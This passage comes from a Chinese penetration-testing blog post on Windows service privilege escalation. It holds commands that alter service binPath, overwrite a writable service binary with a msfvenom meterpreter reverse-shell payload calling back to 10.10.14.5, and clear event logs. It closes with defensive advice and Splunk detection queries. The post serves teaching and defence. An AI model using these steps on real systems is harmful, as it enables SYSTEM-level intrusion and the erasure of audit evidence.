sc.exe config <span class="variable">$ServiceName</span> binPath= <span class="variable">$NewBinPath</span> | <span class="built_in">Out-Null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        sc.exe stop <span class="variable">$ServiceName</span>; <span class="built_in">Start-Sleep</span> <span class="number">3</span></span><br><span class="line">        sc.exe <span class="built_in">start</span> <span class="variable">$ServiceName</span>; <span class="built_in">Start-Sleep</span> <span class="number">3</span></span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;[+] New Status: <span class="variable">$</span>((Get-Service <span class="variable">$ServiceName</span>).Status)&quot;</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123; <span class="built_in">Write-Host</span> <span class="string">&quot;[-] Failed: <span class="variable">$_</span>&quot;</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="7-综合攻击流程"><a href="#7-综合攻击流程" class="headerlink" title="7. 综合攻击流程"></a>7. 综合攻击流程</h2><pre class="mermaid">flowchart TD
+    Start([低权限Shell]) --> Enum[PowerUp.ps1枚举]
+    Enum -->|Unquoted Path| U[检查目录权限→植入载荷→重启服务] --> Shell1[SYSTEM]
+    Enum -->|Writable Binary| W[备份→覆盖→重启→恢复] --> Shell2[SYSTEM]
+    Enum -->|Registry ACL| R[改ImagePath/FailureCommand→重启] --> Shell3[SYSTEM]
+    Enum -->|Service ACL| A[解析SDDL→CHANGE_CONFIG改binPath] --> Shell4[SYSTEM]
+    Shell1 --> Clean[恢复配置/清理痕迹] --> Done([完成])
+    Shell2 --> Clean
+    Shell3 --> Clean
+    Shell4 --> Clean</pre>
+
+<hr>
+<h2 id="8-实战案例"><a href="#8-实战案例" class="headerlink" title="8. 实战案例"></a>8. 实战案例</h2><p><strong>场景</strong>：域用户<code>contoso\jdoe</code>凭据，WinRM登录<code>SRV-WEB01</code>。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-AllChecks</span> | <span class="built_in">Out-File</span> C:\Users\jdoe\Documents\result.txt</span><br><span class="line"><span class="comment"># 输出: AudioEndpointBuilder, Path: C:\Program Files\AudioSoft\audioendpoint.exe</span></span><br><span class="line"><span class="comment"># ModifiableFilePermissions: &#123;BUILTIN\Users, Write&#125;, StartName: LocalSystem</span></span><br></pre></td></tr></table></figure>
+
+<p>验证并部署：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:\Program Files\AudioSoft\audioendpoint.exe&quot;</span><br><span class="line">:: BUILTIN\Users:(W)</span><br><span class="line"><span class="built_in">copy</span> &quot;C:\Program Files\AudioSoft\audioendpoint.exe&quot; &quot;...\audioendpoint.exe.bak&quot;</span><br><span class="line"><span class="built_in">copy</span> /y payload.exe &quot;C:\Program Files\AudioSoft\audioendpoint.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其中payload由<code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe</code>生成。触发并清理：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Restart-Service</span> AudioEndpointBuilder <span class="literal">-Force</span>  <span class="comment"># MSF handler收到SYSTEM会话</span></span><br><span class="line"><span class="built_in">copy</span> /y <span class="string">&quot;...\audioendpoint.exe.bak&quot;</span> <span class="string">&quot;...\audioendpoint.exe&quot;</span></span><br><span class="line"><span class="built_in">Restart-Service</span> AudioEndpointBuilder <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="string">&quot;...\audioendpoint.exe.bak&quot;</span></span><br><span class="line"><span class="built_in">Clear-EventLog</span> <span class="literal">-LogName</span> Application,Security,System</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="9-防御建议"><a href="#9-防御建议" class="headerlink" title="9. 防御建议"></a>9. 防御建议</h2><p><strong>系统管理员</strong>：</p>
+<ol>
+<li>含空格的服务路径统一用双引号包裹</li>
+<li>定期审计服务二进制目录ACL，移除Users&#x2F;Everyone写入权限</li>
+<li>GPO限制对<code>SYSTEM\CurrentControlSet\Services</code>的非管理员访问</li>
+<li><code>sc sdshow</code>审计关键服务SDDL，确保CHANGE_CONFIG仅授予管理员</li>
+<li>第三方软件安装后审计其服务权限配置</li>
+</ol>
+<p><strong>SIEM监控</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Splunk: sc config 修改 binPath</span><br><span class="line">index=windows EventCode=4688 Process_Command_Line=&quot;*sc*config*binPath*&quot;</span><br><span class="line">| table _time, host, user, Process_Command_Line</span><br><span class="line"></span><br><span class="line"># Splunk: 注册表 ImagePath 修改</span><br><span class="line">index=windows EventCode=4657 Object_Name=&quot;*\\Services\\*&quot; Object_Value_Name=&quot;ImagePath&quot;</span><br><span class="line">| table _time, host, SubjectUserName, Old_Value, New_Value</span><br></pre></td></tr></table></figure>
+
+<p><strong>审计工具</strong>：AccessChk、Seatbelt、SharpUp。</p>
+<hr>
+<h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><table>
+<thead>
+<tr>
+<th>漏洞类型</th>
+<th>利用难度</th>
+<th>前置条件</th>
+<th>提权至</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Unquoted Service Path</td>
+<td>低</td>
+<td>路径间隙目录可写</td>
+<td>SYSTEM</td>
+</tr>
+<tr>
+<td>Writable Service Binary</td>
+<td>低</td>
+<td>可写服务文件</td>
+<td>SYSTEM</td>
+</tr>
+<tr>
+<td>Registry ImagePath 可写</td>
+<td>中</td>
+<td>注册表项ACL宽松</td>
+<td>SYSTEM</td>
+</tr>
+<tr>
+<td>FailureCommand 可写</td>
+<td>中</td>
+<td>注册表ACL宽松+服务可崩溃</td>
+<td>SYSTEM</td>
+</tr>
+<tr>
+<td>SDDL 服务ACL缺陷</td>
+<td>中-高</td>
+<td>SCM权限划分不严谨</td>
+<td>SYSTEM</td>
+</tr>
+</tbody></table>
+<p>理解底层原理（SDDL语义、SCM路径解析顺序、注册表服务配置结构）是区分脚本小子与专业渗透测试工程师的关键。</p>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文所述技术仅用于安全研究、授权渗透测试及安全防御体系建设。任何未经授权的安全测试均为违法行为。在安全测试中请遵守《中华人民共和国网络安全法》及相关法律法规，务必获得被测试方明确的书面授权。</p>
+<p><strong>Always Get Written Authorization. Practice Responsibly.</strong></p>
+<p><strong>参考文献</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerSploit - PowerUp.ps1</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">Microsoft - Service Security and Access Rights</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format">Microsoft - Security Descriptor String Format</a></li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1574/011/">MITRE ATT&amp;CK - T1574.011 Services Registry Permissions Weakness</a></li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1574/010/">MITRE ATT&amp;CK - T1574.010 Service File Permissions Weakness</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">HackTricks - Windows Local Privilege Escalation</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings - Windows Privilege Escalation</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag"># 权限提升</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Linux-privesc-methodology/" rel="prev" title="Linux提权方法论与工具">
+                  <i class="fa fa-angle-left"></i> Linux提权方法论与工具
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/SQL-injection-postgresql/" rel="next" title="SQL注入：PostgreSQL注入实战">
+                  SQL注入：PostgreSQL注入实战 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
